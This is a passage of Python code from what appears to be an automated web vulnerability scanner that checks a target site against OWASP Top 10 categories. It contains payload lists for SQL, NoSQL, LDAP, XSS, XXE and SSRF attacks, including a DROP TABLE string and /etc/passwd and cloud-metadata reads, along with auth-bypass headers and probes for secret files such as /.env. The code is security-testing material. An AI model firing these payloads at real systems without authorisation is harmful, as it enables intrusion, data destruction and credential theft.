        
        # Test API endpoints comprehensively
        await self._test_api_endpoints()

    async def _test_owasp_top10(self):
        """Test for OWASP Top 10 vulnerabilities"""
        print("  🔟 Testing OWASP Top 10 vulnerabilities...")
        
        # A01:2021 - Broken Access Control
        await self._test_broken_access_control()
        
        # A02:2021 - Cryptographic Failures
        await self._test_cryptographic_failures()
        
        # A03:2021 - Injection
        await self._test_injection_comprehensive()
        
        # A04:2021 - Insecure Design
        await self._test_insecure_design()
        
        # A05:2021 - Security Misconfiguration
        await self._test_security_misconfiguration()
        
        # A06:2021 - Vulnerable and Outdated Components
        await self._test_vulnerable_components()
        
        # A07:2021 - Identification and Authentication Failures
        await self._test_auth_failures()
        
        # A08:2021 - Software and Data Integrity Failures
        await self._test_integrity_failures()
        
        # A09:2021 - Security Logging and Monitoring Failures
        await self._test_logging_monitoring()
        
        # A10:2021 - Server-Side Request Forgery
        await self._test_ssrf_comprehensive()

    async def _test_broken_access_control(self):
        """Test for broken access control vulnerabilities"""
        print("    🚪 Testing broken access control...")
        
        # Test for forced browsing
        protected_paths = [
            '/admin', '/admin/', '/administrator', '/manage',
            '/user', '/users', '/profile', '/account',
            '/config', '/configuration', '/settings'
        ]
        
        for path in protected_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=5
                )
                
                if response.status_code == 200:
                    print(f"      ⚠️  Potential access control issue: {test_url}")
                    
                    # Check if it actually contains admin content
                    if any(term in response.text.lower() for term in ['admin', 'dashboard', 'control panel']):
                        vuln_id = f"access_control_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'broken_access_control',
                            'severity': 'high',
                            'description': f'Protected area accessible without authentication: {path}',
                            'vulnerable_url': test_url,
                            'attack_vector': 'Direct URL access to protected resources'
                        }
                        
            except Exception:
                continue

    async def _test_cryptographic_failures(self):
        """Test for cryptographic failures"""
        print("    🔐 Testing cryptographic failures...")
        
        try:
            # Check if site uses HTTPS
            if not self.target_url.startswith('https://'):
                vuln_id = f"crypto_http_{int(time.time())}"
                self.discovered_assets['vulnerabilities'][vuln_id] = {
                    'type': 'cryptographic_failure',
                    'severity': 'medium',
                    'description': 'Site does not use HTTPS',
                    'vulnerable_url': self.target_url,
                    'attack_vector': 'Traffic interception and manipulation'
                }
            
            # Test for weak SSL/TLS configuration (if HTTPS)
            if self.target_url.startswith('https://'):
                await self._test_ssl_configuration()
                
        except Exception as e:
            print(f"      ❌ Error testing cryptographic failures: {e}")

    async def _test_ssl_configuration(self):
        """Test SSL/TLS configuration"""
        try:
            import ssl
            import socket
            
            parsed_url = urlparse(self.target_url)
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Create SSL context
            context = ssl.create_default_context()
            
            # Test SSL connection
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Check for weak ciphers
                    if cipher and 'RC4' in cipher[0] or 'DES' in cipher[0]:
                        vuln_id = f"weak_cipher_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'weak_ssl_cipher',
                            'severity': 'medium',
                            'description': f'Weak SSL cipher detected: {cipher[0]}',
                            'vulnerable_url': self.target_url
                        }
                        
        except Exception:
            pass

    async def _test_injection_comprehensive(self):
        """Comprehensive injection testing"""
        print("    💉 Testing comprehensive injection vulnerabilities...")
        
        # Enhanced SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, NULL, NULL--",
            "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
            "' OR (SELECT COUNT(*) FROM sysobjects)>0--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        # NoSQL injection payloads
        nosql_payloads = [
            "[$ne]=1",
            "[$regex]=.*",
            "[$where]=sleep(5000)",
            "[$gt]=",
            "{\"$where\":\"this.username == this.password\"}"
        ]
        
        # LDAP injection payloads
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00"
        ]
        
        # Test each type of injection
        for form_id, form_data in self.discovered_assets.get('forms', {}).items():
            await self._test_form_injections(form_data, {
                'sqli': sqli_payloads,
                'nosql': nosql_payloads,
                'ldap': ldap_payloads
            })

    async def _test_form_injections(self, form_data, injection_payloads):
        """Test form for various injection types"""
        try:
            form_url = form_data.get('url', self.target_url)
            self.driver.get(form_url)
            await asyncio.sleep(2)
            
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            if not forms:
                return
                
            form = forms[0]
            
            for injection_type, payloads in injection_payloads.items():
                for payload in payloads[:3]:  # Test first 3 payloads
                    try:
                        # Find text inputs
                        text_inputs = form.find_elements(By.CSS_SELECTOR, 
                            "input[type='text'], input[type='search'], input:not([type]), textarea")
                        
                        if text_inputs:
                            text_input = text_inputs[0]
                            text_input.clear()
                            text_input.send_keys(payload)
                            
                            # Submit form
                            submit_buttons = form.find_elements(By.CSS_SELECTOR, 
                                "input[type='submit'], button[type='submit'], button")
                            
                            if submit_buttons:
                                submit_buttons[0].click()
                                await asyncio.sleep(2)
                                
                                # Check for injection success
                                if await self._check_injection_response(injection_type, payload):
                                    print(f"      🚨 {injection_type.upper()} injection found!")
                                    await self._record_injection_vulnerability(form_data, payload, injection_type)
                                
                                # Go back for next test
                                self.driver.back()
                                await asyncio.sleep(1)
                                
                    except Exception:
                        continue
                        
        except Exception as e:
            print(f"      ❌ Error testing form injections: {e}")

    async def _check_injection_response(self, injection_type, payload):
        """Check response for injection indicators"""
        page_source = self.driver.page_source.lower()
        
        if injection_type == 'sqli':
            sql_errors = [
                'mysql', 'sql syntax', 'database error', 'warning: mysql',
                'postgresql', 'postgres', 'oracle', 'sqlite', 'syntax error',
                'unterminated quoted string', 'quoted string not properly terminated',
                'microsoft ole db', 'odbc', 'jdbc'
            ]
            return any(error in page_source for error in sql_errors)
            
        elif injection_type == 'nosql':
            nosql_errors = [
                'mongodb', 'invalid bson', 'syntax error', 'unexpected token',
                'invalid operator', 'bad query'
            ]
            return any(error in page_source for error in nosql_errors)
            
        elif injection_type == 'ldap':
            ldap_errors = [
                'ldap', 'invalid dn syntax', 'bad search filter',
                'invalid search base', 'ldap error'
            ]
            return any(error in page_source for error in ldap_errors)
            
        return False

    async def _test_file_upload_vulnerabilities(self):
        """Test for file upload vulnerabilities"""
        print("    📤 Testing file upload vulnerabilities...")
        
        try:
            # Find file upload forms
            for form_id, form_data in self.discovered_assets.get('forms', {}).items():
                form_url = form_data.get('url', self.target_url)
                self.driver.get(form_url)
                await asyncio.sleep(2)
                
                # Look for file input fields
                file_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='file']")
                
                if file_inputs:
                    print(f"      📁 Found file upload form: {form_url}")
                    await self._test_file_upload_security(file_inputs[0], form_url)
                    
        except Exception as e:
            print(f"      ❌ Error testing file uploads: {e}")

    async def _test_file_upload_security(self, file_input, form_url):
        """Test file upload security"""
        try:
            # Create test files
            test_files = {
                'php_shell': 'test.php',
                'asp_shell': 'test.asp', 
                'jsp_shell': 'test.jsp',
                'executable': 'test.exe',
                'script': 'test.js'
            }
            
            # Create temporary PHP test file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
                f.write('<?php echo "File upload test"; ?>')
                temp_file_path = f.name
            
            try:
                # Test file upload
                file_input.send_keys(temp_file_path)
                
                # Find and click submit button
                form = file_input.find_element(By.XPATH, "./ancestor::form")
                submit_buttons = form.find_elements(By.CSS_SELECTOR, 
                    "input[type='submit'], button[type='submit'], button")
                
                if submit_buttons:
                    submit_buttons[0].click()
                    await asyncio.sleep(3)
                    
                    # Check if upload was successful
                    page_source = self.driver.page_source.lower()
                    
                    if any(term in page_source for term in ['uploaded', 'success', 'complete']):
                        vuln_id = f"file_upload_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'insecure_file_upload',
                            'severity': 'high',
                            'description': 'File upload functionality allows dangerous file types',
                            'vulnerable_url': form_url,
                            'attack_vector': 'Upload of executable files or scripts'
                        }
                        print(f"      🚨 Insecure file upload detected!")
                        
            finally:
                # Clean up temporary file
                import os
                try:
                    os.unlink(temp_file_path)
                except:
                    pass
                    
        except Exception as e:
            print(f"      ❌ Error testing file upload security: {e}")

    async def _test_ssrf_vulnerabilities(self):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print("    🔄 Testing SSRF vulnerabilities...")
        
        # SSRF test payloads
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:3306',
            'dict://127.0.0.1:11211/stat'
        ]
        
        # Test URL parameters for SSRF
        for url, params in self.exploration_tree.get('parameters_discovered', {}).items():
            for param_name in params.keys():
                if any(term in param_name.lower() for term in ['url', 'link', 'uri', 'redirect', 'callback']):
                    print(f"      🧪 Testing SSRF in parameter: {param_name}")
                    
                    for payload in ssrf_payloads[:3]:
                        await self._test_ssrf_parameter(url, param_name, payload)

    async def _test_ssrf_parameter(self, url, param_name, payload):
        """Test specific parameter for SSRF"""
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [payload]
            
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Measure response time (SSRF might cause delays)
            start_time = time.time()
            
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=10
                )
                response_time = time.time() - start_time
                
                # Check for SSRF indicators
                if (response_time > 5 or 
                    'connection refused' in response.text.lower() or
                    'timeout' in response.text.lower() or
                    'internal server error' in response.text.lower()):
                    
                    vuln_id = f"ssrf_{param_name}_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'ssrf',
                        'severity': 'high',
                        'parameter': param_name,
                        'payload': payload,
                        'vulnerable_url': test_url,
                        'description': f'SSRF vulnerability in parameter {param_name}'
                    }
                    print(f"        🚨 SSRF vulnerability found in {param_name}!")
                    
            except Exception:
                # Timeout might indicate SSRF
                vuln_id = f"ssrf_timeout_{param_name}_{int(time.time())}"
                self.discovered_assets['vulnerabilities'][vuln_id] = {
                    'type': 'potential_ssrf',
                    'severity': 'medium',
                    'parameter': param_name,
                    'payload': payload,
                    'vulnerable_url': test_url,
                    'description': f'Potential SSRF (timeout) in parameter {param_name}'
                }
                
        except Exception:
            pass

    async def _test_xxe_vulnerabilities(self):
        """Test for XML External Entity (XXE) injection vulnerabilities"""
        print("    📄 Testing XXE vulnerabilities...")
        
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<test>&xxe;</test>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<test>test</test>'''
        ]
        
        # Test forms that might accept XML
        for form_id, form_data in self.discovered_assets.get('forms', {}).items():
            await self._test_form_xxe(form_data, xxe_payloads)

    async def _test_form_xxe(self, form_data, xxe_payloads):
        """Test form for XXE vulnerabilities"""
        try:
            form_url = form_data.get('url', self.target_url)
            self.driver.get(form_url)
            await asyncio.sleep(2)
            
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            if not forms:
                return
                
            form = forms[0]
            
            for payload in xxe_payloads[:2]:  # Test first 2 XXE payloads
                try:
                    text_inputs = form.find_elements(By.CSS_SELECTOR, 
                        "input[type='text'], textarea")
                    
                    if text_inputs:
                        text_input = text_inputs[0]
                        text_input.clear()
                        text_input.send_keys(payload)
                        
                        submit_buttons = form.find_elements(By.CSS_SELECTOR, 
                            "input[type='submit'], button[type='submit'], button")
                        
                        if submit_buttons:
                            submit_buttons[0].click()
                            await asyncio.sleep(3)
                            
                            page_source = self.driver.page_source
                            
                            # Check for XXE indicators
                            if ('root:' in page_source or 
                                'daemon:' in page_source or
                                'bin:' in page_source or
                                'xml parsing error' in page_source.lower()):
                                
                                vuln_id = f"xxe_{int(time.time())}"
                                self.discovered_assets['vulnerabilities'][vuln_id] = {
                                    'type': 'xxe_injection',
                                    'severity': 'high',
                                    'payload': payload[:100] + '...',
                                    'vulnerable_url': form_url,
                                    'description': 'XXE injection vulnerability found'
                                }
                                print(f"      🚨 XXE vulnerability found!")
                                return
                            
                            self.driver.back()
                            await asyncio.sleep(1)
                            
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"      ❌ Error testing XXE: {e}")

    async def _test_api_endpoints(self):
        """Comprehensive API endpoint testing"""
        print("    🔌 Testing API endpoints comprehensively...")
        
        # Common API endpoints to test
        api_endpoints = [
            '/api', '/api/', '/api/v1', '/api/v2', '/api/users', '/api/admin',
            '/rest', '/rest/', '/rest/api', '/rest/v1',
            '/graphql', '/graphql/', '/v1/graphql',
            '/swagger', '/swagger/', '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/api-docs', '/docs', '/documentation'
        ]
        
        for endpoint in api_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            await self._test_api_endpoint_security(test_url)

    async def _test_api_endpoint_security(self, api_url):
        """Test API endpoint security"""
        try:
            # Test different HTTP methods
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
            
            for method in methods:
                try:
                    response = await asyncio.to_thread(
                        self.session.request, method, api_url, timeout=5
                    )
                    
                    if response.status_code == 200:
                        print(f"      ✅ API endpoint responds to {method}: {api_url}")
                        
                        # Check for sensitive information in API response
                        response_text = response.text.lower()
                        
                        if any(term in response_text for term in ['password', 'secret', 'key', 'token']):
                            vuln_id = f"api_info_disclosure_{method}_{int(time.time())}"
                            self.discovered_assets['vulnerabilities'][vuln_id] = {
                                'type': 'api_information_disclosure',
                                'severity': 'medium',
                                'method': method,
                                'vulnerable_url': api_url,
                                'description': f'API endpoint exposes sensitive information via {method}'
                            }
                            
                    elif response.status_code == 401:
                        # Test for authentication bypass
                        await self._test_api_auth_bypass(api_url, method)
                        
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"      ❌ Error testing API endpoint {api_url}: {e}")

    async def _test_api_auth_bypass(self, api_url, method):
        """Test API authentication bypass techniques"""
        bypass_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'Authorization': 'Bearer invalid_token',
            'X-API-Key': 'test',
            'API-Key': 'test'
        }
        
        for header, value in bypass_headers.items():
            try:
                response = await asyncio.to_thread(
                    self.session.request, method, api_url, 
                    headers={header: value}, timeout=5
                )
                
                if response.status_code == 200:
                    vuln_id = f"api_auth_bypass_{header}_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'api_authentication_bypass',
                        'severity': 'high',
                        'method': method,
                        'bypass_header': header,
                        'vulnerable_url': api_url,
                        'description': f'API authentication bypassed using {header} header'
                    }
                    print(f"      🚨 API auth bypass found with {header}!")
                    break
                    
            except Exception:
                continue

    async def _test_forms_comprehensively(self):
        """Comprehensive form testing with all payload types"""
        print("  📝 Comprehensive Form Testing:")
        
        for form_id, form_data in self.discovered_assets['forms'].items():
            print(f"    🧪 Testing {form_id}...")
            
            try:
                # Navigate to form page
                self.driver.get(self.target_url)
                await asyncio.sleep(2)
                
                forms = self.driver.find_elements(By.TAG_NAME, "form")
                if not forms:
                    continue
                    
                form = forms[0]  # Test first form for now
                
                # Test each payload type
                for payload_type, payloads in self.payload_database.items():
                    print(f"      🔍 Testing {payload_type.upper()}...")
                    
                    for payload in payloads[:3]:  # Test first 3 payloads
                        if payload in self.tested_payloads:
                            continue
                            
                        self.tested_payloads.add(payload)
                        
                        try:
                            # Find text inputs
                            inputs = form.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='search'], input:not([type]), textarea")
                            
                            if inputs:
                                text_input = inputs[0]
                                text_input.clear()
                                text_input.send_keys(payload)
                                
                                # Submit form
                                submit_buttons = form.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                                if submit_buttons:
                                    submit_buttons[0].click()
                                    await asyncio.sleep(2)
                                    
                                    # Check for vulnerabilities
                                    vuln_found = await self._check_vulnerability_response(payload_type, payload)
                                    
                                    if vuln_found:
                                        print(f"        🚨 {payload_type.upper()} VULNERABILITY: {payload}")
                                        
                                        # Enhanced vulnerability reporting with proof of concept
                                        vulnerability_id = f"{payload_type}_{int(time.time())}"
                                        current_url = self.driver.current_url
                                        page_source = self.driver.page_source
                                        
                                        # Get form details for reproduction
                                        form_action = form.get_attribute('action') or current_url
                                        form_method = (form.get_attribute('method') or 'GET').upper()
                                        
                                        self.discovered_assets['vulnerabilities'][vulnerability_id] = {
                                            'type': payload_type,
                                            'severity': 'critical' if payload_type == 'sql_injection' else 'high',
                                            'payload': payload,
                                            'location': 'form_input',
                                            'vulnerable_url': current_url,
                                            'form_action': form_action,
                                            'form_method': form_method,
                                            'attack_vector': f'{form_method} form submission with malicious payload',
                                            'proof_of_concept': {
                                                'description': f'{payload_type.replace("_", " ").title()} vulnerability found in web form',
                                                'form_location': current_url,
                                                'payload_used': payload,
                                                'evidence': self._extract_vulnerability_evidence(payload_type, page_source),
                                                'impact': self._get_vulnerability_impact(payload_type),
                                                'reproduction_steps': [
                                                    f'1. Navigate to: {current_url}',
                                                    f'2. Locate the form with action: {form_action}',
                                                    f'3. Input payload in any text field: {payload}',
                                                    f'4. Submit the form',
                                                    f'5. Observe the response for evidence of {payload_type}'
                                                ],
                                                'curl_command': self._generate_curl_command(form_action, form_method, payload)
                                            },
                                            'remediation': {
                                                'description': self._get_vulnerability_remediation(payload_type),
                                                'steps': self._get_remediation_steps(payload_type)
                                            },
                                            'timestamp': datetime.now().isoformat(),
                                            'confidence': 'high'
                                        }
                                        return  # Stop after finding first vuln of this type
                                    
                                    # Go back for next test
                                    self.driver.back()
                                    await asyncio.sleep(1)
                                    
                        except Exception as e:
                            continue
                            
            except Exception as e:
                print(f"      ❌ Form testing error: {e}")

    async def _check_vulnerability_response(self, vuln_type, payload):
        """Check if payload triggered a vulnerability"""
        try:
            # Check for XSS alert
            if vuln_type == 'xss':
                try:
                    alert = self.driver.switch_to.alert
                    alert.accept()
                    return True
                except:
                    pass
                
                # Check if payload is reflected
                if payload in self.driver.page_source:
                    return True
            
            # Check for SQL errors
            elif vuln_type == 'sqli':
                page_source = self.driver.page_source.lower()
                sql_errors = [
                    'mysql', 'sql syntax', 'database error', 'warning: mysql',
                    'postgresql', 'postgres', 'oracle', 'sqlite', 'syntax error',
                    'unterminated quoted string', 'quoted string not properly terminated'
                ]
                
                for error in sql_errors:
                    if error in page_source:
                        return True
            
            # Check for file inclusion
            elif vuln_type in ['lfi', 'rfi']:
                page_source = self.driver.page_source.lower()
                file_indicators = [
                    'root:', 'bin/', 'www-data', '[fonts]', 'for 16-bit app support',
                    '<?php', 'include', 'require', 'fopen'
                ]
                
                for indicator in file_indicators:
                    if indicator in page_source:
                        return True
            
            # Check for command injection
            elif vuln_type == 'command_injection':
                page_source = self.driver.page_source.lower()
                command_indicators = [
                    'uid=', 'gid=', 'groups=', 'volume serial number',
                    'directory of', 'total ', 'drwx', '-rw-'
                ]
                
                for indicator in command_indicators:
                    if indicator in page_source:
                        return True
                        
        except Exception:
            pass
            
        return False

    async def _test_url_parameters(self):
        """Test URL parameters for vulnerabilities"""
        print("  🔗 URL Parameter Testing:")
        
        current_url = self.driver.current_url
        if '?' not in current_url:
            return
            
        base_url, query_string = current_url.split('?', 1)
        params = parse_qs(query_string)
        
        for param_name, param_values in params.items():
            print(f"    🧪 Testing parameter: {param_name}")
            
            original_value = param_values[0] if param_values else ""
            
            # Test XSS in URL parameters
            xss_payload = "<script>alert('XSS')</script>"
            test_params = params.copy()
            test_params[param_name] = [xss_payload]
            
            test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
            
            try:
                self.driver.get(test_url)
                await asyncio.sleep(2)
                
                # Check for XSS
                try:
                    alert = self.driver.switch_to.alert
                    alert.accept()
                    print(f"      🚨 XSS in URL parameter: {param_name}")
                    
                    # Enhanced vulnerability reporting with proof of concept
                    vulnerability_id = f"url_xss_{param_name}_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vulnerability_id] = {
                        'type': 'reflected_xss',
                        'severity': 'high',
                        'parameter': param_name,
                        'payload': xss_payload,
                        'vulnerable_url': test_url,
                        'attack_vector': 'GET parameter injection',
                        'proof_of_concept': {
                            'description': f'XSS vulnerability found in parameter "{param_name}"',
                            'exploit_url': test_url,
                            'payload_used': xss_payload,
                            'evidence': 'JavaScript alert() executed successfully',
                            'impact': 'Attacker can execute arbitrary JavaScript in victim\'s browser',
                            'curl_command': f'curl "{test_url}"',
                            'browser_test': f'Navigate to: {test_url} and observe JavaScript alert'
                        },
                        'remediation': {
                            'description': 'Implement proper input validation and output encoding',
                            'steps': [
                                'Validate and sanitize all user input',
                                'Use context-aware output encoding (HTML, JavaScript, URL)',
                                'Implement Content Security Policy (CSP)',
                                'Use parameterized queries and prepared statements'
                            ]
                        },
                        'timestamp': datetime.now().isoformat(),
                        'confidence': 'high'
                    }
                except:
                    pass
                    
            except Exception:
                continue

    async def _test_http_headers(self):
        """Test HTTP headers for vulnerabilities"""
        print("  📋 HTTP Header Testing:")
        
        # Test common header injections
        header_tests = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'User-Agent': '<script>alert("XSS")</script>',
            'Referer': 'javascript:alert("XSS")',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        for header, value in header_tests.items():
            try:
                response = await asyncio.to_thread(
                    self.session.get, self.target_url, 
                    headers={header: value}, timeout=5
                )
                
                if value in response.text:
                    print(f"    ⚠️ Header reflection: {header}")
                    
                    vuln_id = f"header_injection_{header}_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'header_injection',
                        'severity': 'medium',
                        'header': header,
                        'payload': value,
                        'vulnerable_url': self.target_url,
                        'description': f'Header injection vulnerability in {header}'
                    }
                    
            except Exception:
                continue

    async def _test_auth_bypasses(self):
        """Test for authentication bypasses"""
        print("  🔐 Authentication Bypass Testing:")
        
        # Test for common authentication bypasses
        auth_bypass_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost'
        }
        
        # Test protected paths with bypass headers
        protected_paths = ['/admin', '/administrator', '/manage', '/control']
        
        for path in protected_paths:
            test_url = urljoin(self.target_url, path)
            
            for header, value in auth_bypass_headers.items():
                try:
                    response = await asyncio.to_thread(
                        self.session.get, test_url, 
                        headers={header: value}, timeout=5
                    )
                    
                    if response.status_code == 200:
                        print(f"    🚨 Potential auth bypass with {header}: {path}")
                        
                        vuln_id = f"auth_bypass_{header}_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'authentication_bypass',
                            'severity': 'high',
                            'header': header,
                            'vulnerable_url': test_url,
                            'description': f'Authentication bypass using {header} header'
                        }
                        
                except Exception:
                    continue

    async def _test_business_logic(self):
        """Test for business logic flaws"""
        print("  🧠 Business Logic Testing:")
        
        # Test for common business logic flaws
        # This is a simplified version - real business logic testing requires understanding the application
        
        # Test for price manipulation in forms
        for form_id, form_data in self.discovered_assets.get('forms', {}).items():
            form_inputs = form_data.get('inputs', [])
            
            # Look for price-related fields
            price_fields = [inp for inp in form_inputs 
                          if any(term in inp.get('name', '').lower() 
                               for term in ['price', 'amount', 'cost', 'total'])]
            
            if price_fields:
                print(f"    💰 Found price-related fields in form: {form_id}")
                # Note: Actual testing would require manipulating these values
                
        # Test for quantity manipulation
        quantity_indicators = ['quantity', 'qty', 'amount', 'count']
        # Similar logic for quantity fields
        
        print("    ℹ️  Business logic testing requires manual verification")

    async def _test_wordpress_vulnerabilities(self):
        """Test for WordPress-specific vulnerabilities"""
        print("  🔍 WordPress Vulnerability Testing:")
        
        # Check if WordPress was detected
        if 'WordPress' not in self.discovered_assets.get('technologies', set()):
            print("    ℹ️  WordPress not detected, skipping WordPress-specific tests")
            return
            
        print("    🎯 WordPress detected, running specific tests...")
        
        # Test for XML-RPC vulnerabilities
        xmlrpc_url = urljoin(self.target_url, 'xmlrpc.php')
        try:
            response = await asyncio.to_thread(
                self.session.get, xmlrpc_url, timeout=5
            )
            
            if response.status_code == 200 and 'XML-RPC' in response.text:
                print("    ⚠️ XML-RPC interface is enabled")
                
                vuln_id = f"wp_xmlrpc_{int(time.time())}"
                self.discovered_assets['vulnerabilities'][vuln_id] = {
                    'type': 'wordpress_xmlrpc_enabled',
                    'severity': 'medium',
                    'vulnerable_url': xmlrpc_url,
                    'description': 'WordPress XML-RPC interface is enabled and accessible'
                }
                
        except Exception:
            pass
            
        # Test for user enumeration via REST API
        rest_users_url = urljoin(self.target_url, 'wp-json/wp/v2/users')
        try:
            response = await asyncio.to_thread(
                self.session.get, rest_users_url, timeout=5
            )
            
            if response.status_code == 200:
                try:
                    users_data = response.json()
                    if isinstance(users_data, list) and users_data:
                        print("    🚨 WordPress user enumeration possible via REST API")
                        
                        vuln_id = f"wp_user_enum_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'wordpress_user_enumeration',
                            'severity': 'medium',
                            'vulnerable_url': rest_users_url,
                            'description': 'WordPress REST API exposes user information'
                        }
                except:
                    pass
                    
        except Exception:
            pass
            
        # Test for directory listing in wp-content
        wp_dirs = ['wp-content/', 'wp-content/uploads/', 'wp-content/plugins/', 'wp-content/themes/']
        
        for wp_dir in wp_dirs:
            dir_url = urljoin(self.target_url, wp_dir)
            try:
                response = await asyncio.to_thread(
                    self.session.get, dir_url, timeout=5
                )
                
                if response.status_code == 200 and 'Index of' in response.text:
                    print(f"    ⚠️ Directory listing enabled: {wp_dir}")
                    
                    vuln_id = f"wp_dir_listing_{int(time.time())}"
                    self.discovered_assets['vulnerabilities'][vuln_id] = {
                        'type': 'wordpress_directory_listing',
                        'severity': 'low',
                        'vulnerable_url': dir_url,
                        'description': f'Directory listing enabled in {wp_dir}'
                    }
                    
            except Exception:
                continue

    async def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        print("  🍃 NoSQL Injection Testing:")
        
        nosql_payloads = [
            "[$ne]=1",
            "[$regex]=.*", 
            "[$where]=sleep(5000)",
            "[$gt]=",
            "{\"$where\":\"this.username == this.password\"}"
        ]
        
        # Test parameters for NoSQL injection
        for url, params in self.exploration_tree.get('parameters_discovered', {}).items():
            for param_name in list(params.keys())[:3]:  # Test first 3 parameters
                for payload in nosql_payloads[:2]:  # Test first 2 payloads
                    await self._test_parameter_payload(url, param_name, payload, 'nosql')

    async def _test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities"""
        print("  🗂️ LDAP Injection Testing:")
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00"
        ]
        
        # Test parameters for LDAP injection
        for url, params in self.exploration_tree.get('parameters_discovered', {}).items():
            for param_name in list(params.keys())[:3]:  # Test first 3 parameters
                for payload in ldap_payloads[:2]:  # Test first 2 payloads
                    await self._test_parameter_payload(url, param_name, payload, 'ldap')

    async def _record_injection_vulnerability(self, form_data, payload, injection_type):
        """Record an injection vulnerability"""
        vuln_id = f"injection_{injection_type}_{int(time.time())}"
        
        severity_map = {
            'sqli': 'critical',
            'nosql': 'high', 
            'ldap': 'high',
            'command': 'critical',
            'xss': 'high'
        }
        
        self.discovered_assets['vulnerabilities'][vuln_id] = {
            'type': f'{injection_type}_injection',
            'severity': severity_map.get(injection_type, 'medium'),
            'payload': payload,
            'vulnerable_url': form_data.get('url', self.target_url),
            'form_action': form_data.get('action', ''),
            'form_method': form_data.get('method', 'GET'),
            'attack_vector': f'Form-based {injection_type} injection',
            'timestamp': datetime.now().isoformat()
        }

    async def _test_security_misconfiguration(self):
        """Test for security misconfigurations"""
        print("    ⚙️  Testing security misconfigurations...")
        
        # Test for exposed sensitive files
        sensitive_files = [
            '/.env', '/.git/config', '/config.php', '/wp-config.php',
            '/database.php', '/phpinfo.php', '/info.php', '/test.php',
            '/backup.sql', '/dump.sql', '/.htaccess', '/robots.txt',
            '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml'
        ]
        
        for file_path in sensitive_files:
            test_url = urljoin(self.target_url, file_path)
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=5
                )
                
                if response.status_code == 200:
                    # Check content for sensitive information
                    content_lower = response.text.lower()
                    
                    sensitive_indicators = [
                        'password', 'secret', 'key', 'token', 'database',
                        'mysql', 'postgresql', 'api_key', 'private'
                    ]
                    
                    if any(indicator in content_lower for indicator in sensitive_indicators):
                        vuln_id = f"sensitive_file_{int(time.time())}"
                        self.discovered_assets['vulnerabilities'][vuln_id] = {
                            'type': 'sensitive_file_exposure',
                            'severity': 'high',
                            'file_path': file_path,
                            'vulnerable_url': test_url,
